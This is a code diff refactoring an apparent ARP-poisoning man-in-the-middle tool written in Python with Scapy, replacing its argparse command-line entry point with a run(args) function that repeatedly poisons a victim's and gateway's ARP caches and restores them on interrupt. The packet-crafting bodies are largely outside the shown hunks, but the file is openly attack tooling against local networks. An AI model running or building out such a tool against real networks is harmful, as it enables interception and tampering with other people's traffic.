@@ -1,5 +1,6 @@
+# attacks/arp_poison.py
+
 from scapy.all import *
-import argparse
 import time
 
 def poison_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, interface):
@@ -21,17 +22,7 @@ def restore_network(victim_ip, victim_mac, gateway_ip, gateway_mac, interface):
     except Exception as e:
         print("Failed to restore network: %s" % str(e))
 
-def main():
-    parser = argparse.ArgumentParser(description="Enhanced MITM ARP Poisoning Tool")
-    parser.add_argument("--victim-ip", required=True, help="IP address of the victim's machine")
-    parser.add_argument("--victim-mac", required=True, help="MAC address of the victim's machine")
-    parser.add_argument("--gateway-ip", required=True, help="IP address of the gateway")
-    parser.add_argument("--gateway-mac", required=True, help="MAC address of the gateway")
-    parser.add_argument("--attacker-mac", required=True, help="MAC address of the attacker's machine")
-    parser.add_argument("--interface", default="eth0", help="Network interface to use for sending ARP packets")
-    
-    args = parser.parse_args()
-
+def run(args):
     try:
         while True:
             poison_arp(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.attacker_mac, args.interface)
@@ -39,6 +30,3 @@ def main():
     except KeyboardInterrupt:
         print("Stopping ARP poisoning and restoring network...")
         restore_network(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.interface)
-
-if __name__ == "__main__":
-    main()
